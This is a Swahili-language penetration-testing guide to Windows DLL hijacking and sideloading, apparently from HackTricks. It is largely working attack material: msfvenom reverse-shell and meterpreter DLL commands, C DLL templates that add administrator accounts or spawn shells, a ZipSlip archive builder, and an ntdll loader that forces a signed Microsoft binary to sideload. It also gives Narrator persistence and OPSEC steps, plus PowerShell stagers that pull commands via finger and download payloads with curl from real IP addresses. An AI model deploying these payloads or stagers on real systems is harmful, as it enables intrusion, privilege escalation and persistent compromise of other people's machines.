# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kudanganya programu inayotumika ili iipakishe DLL hatarishi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa code execution, achieving persistence, na, kwa rari zaidi, privilege escalation. Licha ya mkazo wa escalation hapa, njia ya hijacking inabaki sawa kwa malengo yote.

### Mbinu za Kawaida

Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hatarishi, kwa hiari kutumia DLL Proxying ili kuhifadhi utendaji wa DLL asili.
2. **DLL Search Order Hijacking**: Kuweka DLL hatarishi katika njia ya utafutaji kabla ya ile halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hatarishi ambayo programu itapakia, ikidhani ni DLL inayotakiwa lakini haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama `%PATH%` au faili `.exe.manifest` / `.exe.local` ili kuelekeza programu kwa DLL hatarishi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na toleo hatarishi katika saraka ya WinSxS, njia inayohusishwa mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hatarishi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopiwa, ikifanana na Binary Proxy Execution techniques.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, angalia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata Dll Zilizokosekana

Njia ya kawaida kabisa ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuwaweka** **vichujio vifuatavyo 2**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na kisha onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Ikiwa unatafuta **missing dlls in general** uiachi hii ikimbie kwa sekunde chache.\
Ikiwa unatafuta **missing dll** ndani ya executable maalum, unapaswa kuweka **kichujio kingine kama "Process Name" "contains" `<exec name>`, kuiendesha, na kusitisha kukusanya matukio**.

## Exploiting Missing Dlls

Ili escalate privileges, nafasi bora iliyopo ni kuwa na uwezo wa **kuandika a dll ambayo process yenye privileges itajaribu kupakia** katika baadhi ya **mahali ambapo itatafutwa**. Kwa hivyo, tunaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll asili** iko (hali isiyo ya kawaida), au tunaweza **kuandika kwenye folda fulani ambapo dll itatafutwa** na dll asili haipo katika folda yoyote.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Programu za Windows zinatafuta DLL kwa kufuata seti ya njia za utafutaji zilizopangwa mapema, zikifuata mlolongo maalum. Tatizo la DLL hijacking linapotokea ni pale DLL hatarishi inapowekwa kwa kisemi katika moja ya saraka hizi, kuhakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia absolute paths inaporejea DLL zinazohitajika.

Unaweza kuona **DLL search order on 32-bit** systems hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Hilo ndilo mpangilio wa utafutaji wa default ukiwa na **SafeDllSearchMode** imewezeshwa. Wakati haijawezeshwa, current directory inashuka hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kwa 0 (default ni enabled).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji unaanza katika saraka ya executable module ambayo **LoadLibraryEx** inapakia.

Mwisho, kumbuka kwamba **dll inaweza kupakiwa kwa kuonyesha absolute path badala ya jina pekee**. Katika kesi hiyo dll hiyo **itatafutwa tu katika njia hiyo** (ikiwa dll ina dependencies yoyote, zitatafutwa kama zilivyopakiwa kwa jina tu).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitawaelezea hapa.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Tumia **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo mchakato unajaribu kuipima lakini hawezi kuipata.
2. Ikiwa binary inakimbia kwa **schedule/service**, kuangusha DLL yenye mojawapo ya majina hayo ndani ya **application directory** (search-order entry #1) itapakiwa kwenye utekelezaji ufuatao. Katika kesi moja ya skana ya .NET mchakato ulitafuta `hostfxr.dll` katika `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Tuma archive kwa inbox/share inayofuatiliwa; wakati scheduled task itakaporusha mchakato tena itapakia DLL mbaya na kutekeleza msimbo wako kama service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya mchakato mpya iliyoundwa ni kuweka uwanja DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa saraka inayoongozwa na mshambuliaji hapa, mchakato lengwa ambao unangalia DLL iliyoinuliwa kwa jina (hakuna path kamili na hauitumi flags za upakiaji salama) unaweza kulazimishwa kupakia DLL mbaya kutoka kwenye saraka hiyo.

Wazo kuu
- Tengeneza parameta za mchakato kwa RtlCreateProcessParametersEx na toa DllPath maalum inayorejelea folda unayodhibiti (mfano, saraka ambapo dropper/unpacker wako iko).
- Unda mchakato kwa RtlCreateUserProcess. Wakati binary lengwa inapotatua DLL kwa jina, loader itatafuta DllPath hii iliyotolewa wakati wa utatuzi, kuruhusu sideloading yenye uhakika hata wakati DLL mbaya haiko pamoja na EXE lengwa.

Maelezo/mapungufu
- Hii inaathiri mchakato mtoto unaoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri mchakato wa sasa pekee.
- Lengwa lazima iimport au kufanya LoadLibrary ya DLL kwa jina (hakuna path kamili na hauitumi LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na path za absolute zilizo hardcoded haviwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha upeo wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, simplified error handling):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya uendeshaji
- Weka xmllite.dll yenye madhara (inayo-export kazi zinazohitajika au inayofanya proxy kwa ile halisi) katika saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu hapo juu. Loader inatatua import kupitia DllPath uliotolewa na kusideload DLL yako.

Tekiniki hii imeshuhudiwa kwenye mazingira halisi kutekeleza mnyororo wa sideloading wenye hatua nyingi: launcher wa awali hutoa helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft, inayoweza kuibiwa (hijackable) yenye DllPath maalum ili kulazimisha upakiaji wa DLL ya mshambuliaji kutoka katika saraka ya staging.


#### Tofauti kwenye mpangilio wa utafutaji wa dll kutoka kwa nyaraka za Windows

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Wakati a **DLL that shares its name with one already loaded in memory** inapokumbwa, mfumo hupita utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwenye DLL iliyopo kwenye kumbukumbu. **Katika hali hii, mfumo haufanyi utafutaji wa DLL**.
- Katika kesi ambapo DLL inatambulika kama **known DLL** kwa toleo la Windows linalotumika, mfumo utatumia toleo lake la known DLL, pamoja na DLL zake zote za kuitegemea, **bila kufanya mchakato wa utafutaji**. Key ya registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya DLL hizi zinazojulikana.
- Ikiwa **DLL ina dependencies**, utafutaji wa DLL hizi tegemezi unafanywa kana kwamba zilielezewa kwa majina ya **module**, bila kujali ikiwa DLL ya awali ilitambuliwa kupitia njia kamili.

### Kupandisha Vibali

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **vibali tofauti** (horizontal or lateral movement), ambao **unakosa DLL**.
- Hakikisha kuna **ufikiaji wa kuandika** kwa **saraka** yoyote ambamo **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, mahitaji ni magumu kuyapata kwa sababu **kwa chaguo-msingi ni adimu kupata executable yenye vibali inayokosa dll** na ni hata **adimu zaidi kuwa na ruhusa za kuandika kwenye folda ya system path** (hutaweza kwa chaguo-msingi). Lakini, katika mazingira yaliyopangwa vibaya hili linawezekana.\
Ikiwa una bahati na unajikuta unakidhi mahitaji, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni bypass UAC**, unaweza kupata hapo **PoC** ya Dll hijaking kwa toleo la Windows utakao tumia (labda kwa kubadilisha tu njia ya saraka ambako una ruhusa za kuandika).

Kumbuka kwamba unaweza **kuangalia ruhusa zako katika saraka** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa za kuandika katika **System Path folder** angalia:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za otomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Zana nyingine za kuvutia za otomatiki kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Iwapo utakutana na senario inayoweza kutumiwa, mojawapo ya mambo muhimu ili kui-exploit kwa mafanikio ni **kuunda a dll that exports at least all the functions the executable will import from it**. Vilevile, kumbuka kwamba Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **how to create a valid dll** ndani ya utafiti huu wa dll hijacking unaolenga dll hijacking kwa ajili ya utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata**n unaweza kupata baadhi ya **mifano ya msingi ya dll** ambayo inaweza kuwa muhimu kama **templates** au kuunda **dll with non required functions exported**.

## **Kuunda na kukusanya Dlls**

### **Dll Proxifying**

Kwa msingi **Dll proxy** ni Dll inayoweza **kutekeleza msimbo wako mbaya unapopakuliwa** lakini pia **kuonyesha** na **kufanya kazi** kama **inavyotarajiwa** kwa **kurusha simu zote kwa maktaba halisi**.

Kwa zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **kuonyesha executable na kuchagua maktaba** unayotaka ku-proxify na **kuzalisha dll iliyoproxify** au **kuonyesha Dll** na **kuzalisha dll iliyoproxify**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86, sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika matukio kadhaa Dll unayoitengeneza inapaswa **ku-export functions kadhaa** ambazo zitatumwa/pakiwa na victim process; ikiwa functions hizi hazipo, **binary haitoweza kuzipakia** na **exploit itashindwa**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa DLL ya C++ na uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL ya C mbadala yenye kiingilio la thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Uchunguzi wa kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado inatafuta DLL ya localization maalum kwa lugha wakati wa kuanza — DLL hii inaweza ku-hijack kwa arbitrary code execution na persistence.

Mambo muhimu
- Njia ya uchunguzi (builds za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya legacy (builds za zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa na inayodhibitiwa na mshambuliaji ipo katika njia ya OneCore, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` hufanyika. Hakuna exports zinahitajika.

Uchunguzi kwa Procmon
- Kichujio: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na tazama jaribio la kupakia njia iliyo hapo juu.

DLL ndogo kabisa
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack itasababisha kuzungumza/kuelezea UI. Ili kubaki kimya, unapofanya attach or enumerate Narrator threads, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` ile; endelea kwenye thread yako mwenyewe. Tazama PoC kwa msimbo kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa hayo, kuanzisha Narrator kunapakia DLL uliyoweka. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako inatekelezwa kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP kwenda kwenye host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako inatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji unasimama wakati kikao cha RDP kinapofungwa—inject/migrate mara moja.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili entry ya rejista ya built-in Accessibility Tool (AT) (km. CursorIndicator), uibadilishe iuelekee kwa binary/DLL yoyote, ui-import, kisha weka `configuration` kwa jina la AT hilo. Hii inawezesha utekelezaji wowote kupitia mfumo wa Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji ruhusa za admin.
- Mantiki yote ya payload inaweza kuwepo katika `DLL_PROCESS_ATTACH`; hakuna exports zinahitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Kesi hii inaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), iliyosajiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inaendeshwa kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliye ingia.
- **Directory Permissions**: Writable by `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuweka faili yoyote.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka kwenye saraka ya kazi kwanza na inaandika log "NAME NOT FOUND" ikiwa haipo, ikionyesha upendeleo kwa saraka ya ndani.

### Exploit Implementation

Mshambuliaji anaweza kuweka stub ya uharibifu ya `hostfxr.dll` katika saraka hiyo hiyo, akitumia upungufu wa DLL ili kupata utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, leta `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ifanye kazi saa 9:30 AM kwa muktadha wa mtumiaji wa sasa.
3. Ikiwa administrator ameingia wakati kazi inatekelezwa, DLL hatari itaendeshwa katika session ya administrator kwa medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi vibali vya SYSTEM.

## Uchunguzi wa Kesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Watendaji wa tishio mara nyingi huoanisha droppers za MSI na DLL side-loading ili kutekeleza payload chini ya mchakato uliothibitishwa na kusainiwa.

Chain overview
- Mtumiaji anapakua MSI. A CustomAction huendesha kimya wakati wa installer ya GUI (mfano, LaunchApplication au hatua ya VBScript), ikijenga tena hatua inayofuata kutoka kwa resources zilizojengwa ndani.
- Dropper huandika EXE halali, iliyosainiwa na DLL hatari kwenye saraka moja (mfano: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wakati EXE iliyosainiwa inaanzishwa, Windows DLL search order inaleta wsc.dll kutoka kwa working directory kwanza, ikitekeleza msimbo wa mshambuliaji chini ya parent iliyosainiwa (ATT&CK T1574.001).

MSI analysis (what to look for)
- Jedwali la CustomAction:
- Angalia entries zinazotekeleza executables au VBScript. Mfano wa muundo wa shaka: LaunchApplication ikitekeleza faili iliyojengwa ndani kwa background.
- Katika Orca (Microsoft Orca.exe), kagua CustomAction, InstallExecuteSequence na Binary tables.
- Payload zilizojengwa/kugawanywa katika MSI CAB:
- Uchimbaji wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta fragments ndogo kadhaa zinazounganishwa na kufunguliwa na VBScript CustomAction. Mtiririko wa kawaida:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading ya vitendo na wsc_proxy.exe
- Weka faili hizi mbili kwenye folda hiyo hiyo:
- wsc_proxy.exe: mwenyeji halali aliye saini (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: DLL ya mshambuliaji. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, jenga proxy DLL na elekeza exports zinazohitajika kwa maktaba halisi huku ukitekeleza payload katika DllMain.
- Tengeneza payload ya DLL ndogo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia framework ya proxying (mfano, DLLirant/Spartacus) ili kuzalisha forwarding DLL ambayo pia inatekeleza payload yako.

- Tekniki hii inategemea DLL name resolution na host binary. Ikiwa host inatumia absolute paths au safe loading flags (mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na zinapaswa kuzingatiwa wakati wa kuchagua host binary na export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point iliweka wazi jinsi Ink Dragon inavyopeleka ShadowPad kwa kutumia **triadi ya faili tatu** ili kujificha ndani ya programu halali huku ikihakikisha payload kuu iko encrypted kwenye diski:

1. **Signed host EXE** – wauzaji kama AMD, Realtek, au NVIDIA wanatumika vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Wadukuzi wanabadilisha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode inabaki kuwa halali.
2. **Malicious loader DLL** – inang'olewa kando ya EXE kwa jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hii kawaida ni MFC binary iliyofichwa kwa ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, ku-decrypt, na ku-map reflectively ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye saraka ile ile. Baada ya memory-mapping decrypted payload, loader hufuta faili la TMP ili kuharibu ushahidi wa forensiki.

Tradecraft notes:

* Kubadilisha jina la signed EXE (wakati ukihifadhi `OriginalFileName` ya asili kwenye PE header) kumruhusu kujifanya Windows binary lakini kubaki na saini ya vendor, hivyo rudia tabia ya Ink Dragon ya kuang'oa binaries zinazoonekana `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
* Kwa sababu executable inabaki kuaminika, udhibiti mwingi wa allowlisting unahitaji tu malicious DLL yako iwe kando yake. Lenga kubinafsisha loader DLL; signed parent kwa kawaida inaweza kukimbia bila kuguswa.
* Decryptor ya ShadowPad inatarajia TMP blob iwe kando ya loader na iwe writable ili iweze ku-zero faili baada ya mapping. Weka saraka iwe writable hadi payload inapakia; mara itakapokuwa kwenye memory, faili ya TMP inaweza kufutwa salama kwa ajili ya OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators wanapanga DLL sideloading pamoja na LOLBAS ili kifaa pekee cha kawaida kwenye diski kiwe malicious DLL kando ya EXE yenye kuaminika:

- **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` hupakua maandishi kupitia TCP/79; `| cmd` inatekeleza majibu ya server, ikiwezesha operators kuzungusha second stage server-side.

- **Built-in download/extract:** Download an archive with a benign extension, unpack it, and stage the sideload target plus DLL under a random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
